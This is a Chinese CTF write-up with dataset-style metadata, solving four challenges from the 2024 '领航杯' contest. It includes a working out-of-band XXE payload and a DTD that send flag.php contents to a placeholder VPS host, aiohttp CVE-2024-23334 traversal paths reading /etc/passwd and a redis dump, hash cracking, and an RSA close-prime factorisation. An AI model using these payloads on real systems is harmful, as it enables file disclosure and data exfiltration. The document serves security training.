---
title: 2024"领航杯"-高职组初赛WP（一）
contest: 领航杯
year: 2024
difficulty: medium
vuln_type: [xxe, ssrf, lfi, web_unknown, crypto_rsa]
tags: [XXE out-of-band DTD, Aiohttp CVE-2024-23334 目录穿越, redis dump.rdb, PostgreSQL docker 恢复, rockyou 字典爆破, RSA AMM 开方, p = next_prime(iroot(n))]
attack_chain: 1. Web_sql_xxe: vi -r index.php.swp 拿源码 → 登录界面 POST XML → out-of-band XXE 读 flag.php / 2. Web_aio: aiohttp 目录穿越 CVE-2024-23334 → /static/../../../../var/lib/redis/dump.rdb / 3. Misc_PG: 蚁剑下载 pg.tar.gz → docker 启动 PostgreSQL → rockyou 爆破 hash → flag / 4. Crypto_1zRSA: p^2 ≈ n → next_prime(iroot(n)) 拿 p → AMM 算法开 e=33 次方根
key_payload: <?xml version="1.0"?><!DOCTYPE a [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" ><!ENTITY % dtd SYSTEM "http://VPS:8000/evil.dtd" >%dtd;%send;]> ; /static/../../../var/lib/redis/dump.rdb ; p1=gmpy2.iroot(n,2)[0] ; while n % p1 != 0: p1 = gmpy2.next_prime(p1) ; AMM(c, 33, p)
one_liner: XXE OOB + Aiohttp 目录穿越 + Redis dump + PG docker 恢复 + RSA AMM 33次方。
lesson: aiohttp 3.9.1 之前都有 CVE-2024-23334 目录穿越；RSA p^2 接近 n 时 p = next_prime(iroot(n))。
quality: medium
---
# 2024"领航杯"-高职组初赛WP（一）

## 1. Web_sql_xxe（XXE OOB）

```bash
# 备份文件 .index.php.swp
vi -r index.php
# 源码：登录界面 + sprintf 注入 + blacklist 过滤
```

XXE 走 OOB 外带：
```xml
<?xml version="1.0"?>
<!DOCTYPE a [
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php">
  <!ENTITY % dtd SYSTEM "http://VPS:8000/evil.dtd">
  %dtd; %send;
]>
```

VPS 上 evil.dtd：
```xml
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://VPS:8000/?s=%file;'>">
%all;
```

## 2. Web_aio（Aiohttp CVE-2024-23334 目录穿越）

```python
# aiohttp 3.9.1 之前目录穿越
# /static/../../../../../etc/passwd
# /static/../../../var/lib/redis/dump.rdb
# 读取 redis 持久化文件 → flag
```

## 3. Misc_PG（PostgreSQL docker 恢复 + 爆破）

```python
# 蚁剑流量下载 pg.tar.gz
# 含 database.php + utils.php（hash 生成规则）
# 还原 PG 数据库（docker 启动修复）
# rockyou 字典爆破 hash → 密码 motocross
def get_hash(password):
    h = hashlib.sha1(password.encode()).hexdigest()
    h_list = [h[i:i+2] for i in range(0, len(h), 2)]
    new = [t[1:] if t.startswith('0') else t for t in h_list]
    return ''.join(new)
```

## 4. Crypto_1zRSA（RSA AMM 开 33 次方根）

```python
# e = 33 = 3*11
# p = getPrime(1024); q = next_prime(p); n = p*q
# p^2 接近 n（q 紧接 p）
n = 20157817216833049974118616679190322575901864730668507144482957326182327740713453136333068539106100083027097757551546799575541531293312944887561483280916726369016319612934944450526019975934692298293195561411060477885773405036861008621958822147021639661752191557841624683504007344816984603147270693016174228339440038288427589158890266471648249125569765932533982185987755634089743765749564333612512194933232263756745378109393583291224010700913573540529420652068898993898479078127254056483844853346390136211506294067721897916177680505768950977554254296490057308239156157838713269319343550186321669135205346102566222209669

p1 = gmpy2.iroot(n, 2)[0]
while n % p1 != 0:
    p1 = gmpy2.next_prime(p1)
p = p1
q = n // p
```

**AMM 算法开 33 次方根**：
```python
def AMM(x, e, p):
    # p-1 = e^t * s
    # y random 找 y^((p-1)/e) != 1
    # a = y^(e^(t-1) * s)
    # b = x^(e*alpha - 1)
    # root = x^(alpha * h) mod p
    # 加 a^i 收集所有 e 次方根
```

flag = `CnHongke{a5c3895e-cb83-47aa-9674-03f8644b24c0}`
